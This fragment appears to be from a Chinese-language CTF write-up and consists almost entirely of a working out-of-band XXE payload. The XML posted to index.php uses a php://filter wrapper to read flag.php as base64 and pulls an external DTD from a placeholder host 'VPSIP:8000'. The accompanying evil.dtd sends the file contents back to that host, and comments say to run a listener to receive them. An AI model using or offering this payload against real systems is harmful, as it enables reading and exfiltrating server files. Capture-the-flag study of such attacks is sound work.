...
#post提交到index.php的xml数据：<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPSIP:8000/evil.dtd" >%dtd;%send;]>

#本地或VPS开启web监听，并提供evil.dtd供靶机访问<!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://VPSIP:8000/?s=%file;'>">%all;
